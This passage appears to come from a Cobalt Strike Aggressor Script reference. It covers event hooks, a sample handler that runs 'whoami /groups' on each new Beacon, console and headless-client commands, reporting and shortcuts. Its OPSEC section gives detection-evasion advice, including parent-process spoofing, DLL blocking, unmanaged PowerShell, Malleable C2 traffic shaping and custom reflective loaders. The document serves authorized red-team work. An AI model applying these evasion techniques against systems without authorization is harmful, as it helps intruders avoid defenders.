|`ssh_error`|`$1`=session ID, `$2`= message text, `$3`= time message occurred|Fired when an error is posted to SSH console.|
|`ssh_indicator`|`$1`=session ID, `$2`=user responsible, `$3`=message text, `$4`=time occurred|Fired when IOC notice is posted to SSH console.|
|`ssh_initial`|`$1`=session ID|Fired when an SSH session is seen for first time|
|`ssh_input`|`$1`=session ID, `$2`=user responsible, `$3`= message text, `$4`= time occurred|Fired when an input message is posted to SSH console.|
|`ssh_output`|`$1`=session ID, `$2`=message text, `$3`=time occurred|Fired when output is posted to SSH console.|
|`ssh_output_alt`|`$1`=session ID, `$2`=message text, `$3`=time occurred|Fired when (alternate) output is posted to SSH console.|
|`ssh_tasked`|`$1`=session ID, `$2`= message text, `$3`= time occurred|Fired when a task acknowledgement is posted to SSH console.|
|`web_hit`|`$1`=method,`$2`=requested URI,`$3`=visitor address,`$4`=User-Agent,`$5`=web server response,`$6`=response size,`$7`=handler description,`$8`=dictionary containing params,`$9`=time hit took place|Fired when there's a new hit on Cobalt Strike's webserver.|

### The `on` Keyword

Use the `on` keyword to register an event handler:

```cna
on beacon_initial {
    blog($1, "New Beacon: " . beacon_info($1, "computer"));
    bshell($1, "whoami /groups");
}
```

## Aggressor Script Console

The Aggressor Script console (View -> Script Console) allows you to interact with the scripting engine directly. Useful commands:

*   `x expression` - Evaluate an expression and print the result.
*   `e statement` - Execute a statement.
*   `? predicate` - Evaluate a predicate (true/false expression).
*   `ls` - List loaded scripts.
*   `load /path/to/script.cna` - Load a script.
*   `unload script.cna` - Unload a script.
*   `reload script.cna` - Reload a script.
*   `help` - Show help.

## Headless Client (`agscript`)

You can run Aggressor Script without the Cobalt Strike GUI using the `agscript` program (included in the Linux package):

```bash
./agscript <host> <port> <user> <password> [script.cna]
```

This is useful for creating long-running bots or automating tasks.

## OPSEC Considerations

*   **Logging:** *Always* use `&binput` before running commands via `&bshell`, `&brun`, `&bpowershell`, etc.  This ensures that your actions are properly logged and attributed.  Use `&btask` to provide descriptive information about the task, and include a MITRE ATT&CK tactic ID if applicable.

*   **Process Injection:** Be mindful of process injection.
    *   Use `spawnto` to control the process spawned for post-ex jobs.  Avoid `rundll32.exe`.
    *   Use `ppid` to set a parent process ID.
    *   Use `blockdlls` to prevent non-Microsoft DLLs from loading in child processes (Windows 10+).
    *   Consider using the `PROCESS_INJECT_SPAWN` and `PROCESS_INJECT_EXPLICIT` hooks for custom injection techniques.

*   **Avoid `cmd.exe` when possible:**  Use `&brun` instead of `&bshell` when you don't need the shell's output.

*   **PowerShell:** Use `&bpowerpick` (Unmanaged PowerShell) when possible to avoid `powershell.exe`.  If you *must* use `powershell.exe`, customize the command line using the `POWERSHELL_COMMAND` hook.

*   **Stageless Payloads:**  Whenever possible, use stageless payloads (generated with `&artifact_payload`) instead of staged payloads.

*   **Malleable C2:**  Carefully craft your Malleable C2 profile to blend in with legitimate traffic and avoid known indicators.  Use the `c2lint` tool to check your profile for errors.

*   **BOFs (Beacon Object Files):**  Use BOFs for small, frequently used tasks to avoid the overhead of spawning new processes.

*   **User-Defined Reflective Loaders (UDRLs):** For advanced evasion, consider implementing a custom reflective loader.

*   **Don't exit Beacon unless necessary:** Injected DLLs/shellcode will not be cleaned up. Terminate processes as necessary.

## Reporting
*   **Activity Report:** Timeline of red team activities.
*   **Hosts Report:**  Information collected, per host.
*   **Indicators of Compromise:**  Analysis of your Malleable C2 profile and other indicators.
*   **Sessions Report:**  Indicators and activity, per session.
*   **Social Engineering:**  Results of spear phishing campaigns.
*   **Tactics, Techniques, and Procedures:** Maps actions to the MITRE ATT&CK Matrix.

**Report Customizations**
Goto CobaltStrike->Preferences->Reporting to:
*   Change the logo.
*   Set accent colors.
*	Load custom reports.

## Hooks
Hooks allow you to modify and extend Cobalt Strike's behavior.

|Hook|Description|
|---|---|
|`APPLET_SHELLCODE_FORMAT`|Format shellcode before placed on HTML page generated to serve the Signed or Smart Applet Attacks.|
|`BEACON_RDLL_GENERATE`|Hook used to implement basic Reflective Loader replacement.|
|`BEACON_RDLL_SIZE`|Hook used to indicate that more than 5KB space will be required for the reflectiveloader.|
|`BEACON_RDLL_GENERATE_LOCAL`| Hook used to implement advanced Reflective Loader replacement.|
|`BEACON_SLEEP_MASK`|Update a Beacon payload with User Defined Sleep Mask|
|`EXECUTABLE_ARTIFACT_GENERATOR`|Control the EXE and DLL generation|
|`HTMLAPP_EXE`|Controls the content of the HTML Application User-driven(EXE Output)|
|`HTMLAPP_POWERSHELL`|Controls the content of the HTML Application User-driven(PowerShell Output)|
|`LISTENER_MAX_RETRY_STRATEGIES`|Returns a string that contains a list of definitions to retry|
|`POWERSHELL_COMMAND`|Change the format of powershell command|
|`POWERSHELL_COMPRESS`|Compress a PowerShell script|
|`POWERSHELL_DOWNLOAD_CRADLE`|Change the form of PowerShell download cradle|
|`PROCESS_INJECT_EXPLICIT`|Hook to allow user to define how explicit process injection is implemented.|
|`PROCESS_INJECT_SPAWN`|Hook to allow users to define how the fork and run process injection is implemented.|
|`PSEXEC_SERVICE`|Set service name used by `jump psexec\|psexec64\|psexec_psh` and `psexec`|
|`PYTHON_COMPRESS`|Compress a Python script|
|`RESOURCE_GENERATOR`|Control the format of the VBS template used in Cobalt Strike.|
|`RESOURCE_GENERATOR_VBS`| Controls the content of the HTML Application User-driven(EXE Output).|
|`SIGNED_APPLET_MAINCLASS`|Specify Java Applet file to use for the Java Signed Applet Attack|
|`SIGNED_APPLET_RESOURCE`| Specify a Java Applet file to use for the Java Signed Applet Attack.|
|`SMART_APPLET_MAINCLASS`|Specify the MAIN class of the Java Smart Applet Attack.|
|`SMART_APPLET_RESOURCE`|Specify a Java Applet file to use for the Java Smart Applet Attack.|

## Keyboard Shortcuts

| Shortcut            | Where        | Action                                                                           |
| :------------------ | :----------- | :------------------------------------------------------------------------------- |
| Ctrl+A              | console      | Select all text                                                                 |
| Ctrl+F              | console      | Open find tool                                                                   |
| Ctrl+K              | console      | Clear the console                                                                |
| Ctrl+Minus          | console      | Decrease font size                                                               |
| Ctrl+Plus           | console      | Increase font size                                                               |
| Ctrl+0              | console      | Reset font size                                                                  |
| Down                | console      | Show next command in history                                                     |
| Escape              | console      | Clear edit box                                                                   |
| PageDown            | console      | Scroll down                                                                      |
| PageUp              | console      | Scroll up                                                                        |
| Tab                 | console      | Complete command (in some console types)                                        |
| Up                  | console      | Show previous command in history                                                 |
| Ctrl+B              | everywhere   | Send current tab to the bottom                                                  |
| Ctrl+D              | everywhere   | Close current tab                                                                |
| Ctrl+Shift+D        | everywhere   | Close all tabs except the current one                                            |
| Ctrl+E              | everywhere   | Remove the tab at the bottom (undo Ctrl+B)                                        |
| Ctrl+I              | everywhere   | Choose a session to interact with                                                |
| Ctrl+Left           | everywhere   | Switch to previous tab                                                           |
| Ctrl+O              | everywhere   | Open preferences                                                                 |
| Ctrl+R              | everywhere   | Rename the current tab                                                          |
| Ctrl+Right          | everywhere   | Switch to next tab                                                               |
| Ctrl+T              | everywhere   | Take screenshot of current tab                                                   |
| Ctrl+Shift+T       | everywhere   | Take screenshot of Cobalt Strike (result sent to team server)                      |
| Ctrl+W              | everywhere   | Open current tab in its own window                                              |
| Ctrl+C              | graph        | Arrange sessions in a circle                                                     |
| Ctrl+H              | graph        | Arrange sessions in a hierarchy                                                  |
| Ctrl+Minus          | graph        | Zoom out                                                                         |
| Ctrl+P             | graph        | Save graph to a picture|
| Ctrl+Plus           | graph        | Zoom in                                                                          |
| Ctrl+S              | graph        | Arrange sessions in a stack                                                      |
| Ctrl+0              | graph        | Reset to default zoom level                                                      |
| Ctrl+F              | tables       | Open find tool to filter table content                                            |
| Ctrl+A              | targets      | Select all hosts                                                                 |
| Escape              | targets      | Clear selected hosts                                                              |

